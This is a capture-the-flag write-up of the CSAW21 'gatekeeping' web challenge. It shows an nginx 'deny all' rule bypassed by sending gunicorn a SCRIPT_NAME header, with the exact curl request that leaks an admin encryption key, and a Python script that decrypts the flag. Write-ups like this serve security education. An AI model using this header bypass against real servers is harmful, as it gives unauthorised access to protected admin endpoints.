# gatekeeping | CSAW21 Quals

## Description 

My previous flag file got encrypted by some dumb ransomware. They didn't even tell me how to pay them, so I'm totally out of luck. All I have is the site that is supposed to decrypt my files (but obviously that doesn't work either).

Author: itszn, Ret2 Systems

http://web.chal.csaw.io:5004/

## TL;DR

Bypass nginx with `SCRIPT_NAME` headers to access `/admin/key` endpoint and leak key, decrypt the file locally.

## Work

Running the given dockerfile shows us that the dockerfile installs gunicorn and nginx.
```
 => [2/6] RUN apt update   && apt install -y nginx   && pip3 install gunicorn flask pycrypto supervisor   && use  27.0s
```

Looking more into the source files, I found this piece in the source for app.py which describes a conversation between what I assume are two developers.

```
# <Alex> Is this safe?
# <Brad> Yes, because we have `deny all` in nginx.
# <Alex> Are you sure there won't be any way to get around it?
# <Brad> Here, I wrote a better description in the nginx config, hopefully that will help
# <Brad> Plus we had our code audited after they stole our coins last time      
# <Alex> What about dependencies?
# <Brad> You are over thinking it. no one is going to be looking. everyone we encrypt is so bad at security they would never be able to find a bug in a library like that
# ===       
@app.route('/admin/key')
def get_key():
    return jsonify(key=get_info()['key'])
```

Found this piece in app.py as well, which outlines decrypting the file. Remember this for later, because it will come handy.

```py
@app.route('/decrypt', methods=['POST'])
def decrypt():
    info = get_info()
    if not info.get('paid', False):
        abort(403, 'Ransom has not been paid')

    key = binascii.unhexlify(info['key'])
    data = request.get_data()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)

    return cipher.decrypt(data)
```

Found this piece in a .js file, looks for `key_id` in `/decrypt`
```js
    try {
      let res = await fetch('/decrypt', {
        method:'POST',
        headers: {
          key_id
        },
        body: data
      });
```

Here I put in the flag file to decrypt on the website, intercepted the request, and sent it to burpsuite. Inside burpsuite was a response that contained the `key_id`:

```
key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d
```

Here I got stuck, so I decided to look over the hidden chat. This particular line stuck out to me:

```
You are over thinking it. no one is going to be looking. everyone we encrypt is so bad at security they would never be able to find a bug in a library like that
```

I started to google (gunicorn)[https://github.com/benoitc/gunicorn/issues/226] and (nginx)[https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/] exploits. The gunicorn google turned up interesting behavior...

```
Well... Current behaviour is not what I expected.
I'd expect it to strip the SCRIPT_NAME of the PATH_INFO, if PATH_INFO starts with it.
And that doesn't break current behaviour, unless there are people out there that depend on their workers throwing IndexError and their proxies returning 500 errors.
```

Googling further into gunicorn exploits with `script_name`, I found (this)[https://stackoverflow.com/questions/63419829/nginx-and-gunicorn-wsgi-variables] stackoverflow post regarding the `script_name` variable.

```
The Gunicorn documentation suggests that you can specify SCRIPT_NAME through an HTTP header without any further explanation. Digging through the source code revealed that it accepts a non-standard header actually named SCRIPT_NAME. The following can be used to set SCRIPT_NAME for Gunicorn:

proxy_set_header SCRIPT_NAME /myapp;

PATH_INFO cannot be set. However, in my case PATH_INFO does not need to be set for Gunicorn because it automatically strips the SCRIPT_NAME prefix from PATH_INFO. With uWSGI I had to overwrite PATH_INFO to strip the SCRIPT_NAME prefix.
```

Reading through this post, I attempted to intercept the get request for `/admin/key` through burp, and add a `SCRIPT_NAME` header:

```
GET /f0ur3y3s/admin/key HTTP/1.1
Host: web.chal.csaw.io:5004
SCRIPT_NAME: /f0ur3y3s
key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d
```

However, this did not work as expected, and I know that Burp sometimes does some weird things while intercepting requests. I ditched Burpsuite and attempted to craft my own GET request from the server.
```
┌──(kali㉿kali)-[~]
└─$ curl -X GET http://web.chal.csaw.io:5004/f0ur3y3s/admin/key --header "SCRIPT_NAME:/f0ur3y3s" --header "key_id:05d1dc92ce82cc09d9d7ff1ac9d5611d"

{"key":"b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3"}
```

Success! Now we have the `key_id` and `key` used to encrypt the file. Remember the `decrypt` function in app.py? We can use that to decrypt the file locally.

```py
import binascii
from Crypto.Cipher import AES

keydata = 'b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3'

key = binascii.unhexlify(keydata)
with open('dist/flag.txt.enc', 'rb') as f:
    data = f.read()
iv = data[:AES.block_size]
data = data[AES.block_size:]
cipher = AES.new(key, AES.MODE_CFB, iv)
print(cipher.decrypt(data))
```

```
python breakthegate.py
b'o\x8f|\x10\xd4GJ\x8b\x14\xd6\x0f\xe7g\xc1/\xc5flag{gunicorn_probably_should_not_do_that}'

flag{gunicorn_probably_should_not_do_that}
```
## Flag

flag{gunicorn_probably_should_not_do_that}